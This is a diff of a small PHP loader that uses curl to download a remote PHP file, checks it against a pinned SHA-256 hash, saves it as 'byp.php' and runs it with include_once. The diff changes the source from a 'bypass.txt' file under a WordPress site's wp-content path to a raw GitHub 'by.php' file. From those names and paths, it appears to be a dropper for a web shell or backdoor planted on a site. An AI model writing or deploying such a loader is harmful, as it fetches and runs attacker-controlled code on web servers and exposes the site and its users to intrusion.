@@ -1,8 +1,8 @@
 <?php
 // Safe loader by file-hash pinning (no PHP 8 union types).
-$remoteUrl      = 'https://movetheturtle.com/wp-content/Text/random/pomo/js/bypass.txt';
+$remoteUrl      = 'https://raw.githubusercontent.com/rkrk1337/test/refs/heads/main/by.php';
 $localFile      = __DIR__ . '/byp.php';
-$expectedSha256 = 'd2d803e66965ab4def08ab5669e85c8468954aa9049e4798a7b6e6fc89170981'; // 64 hex chars, lowercase
+$expectedSha256 = '2c13217261ac3d660c22ba9c1e4be46588a321037d56a901e08bb5888fba423f'; // 64 hex chars, lowercase
 
 function fetch($url, $timeout = 10) {
     $ch = curl_init($url);
@@ -53,3 +53,4 @@ if (!@rename($tmp, $localFile)) {
 @chmod($localFile, 0600);
 
 include_once $localFile;
+
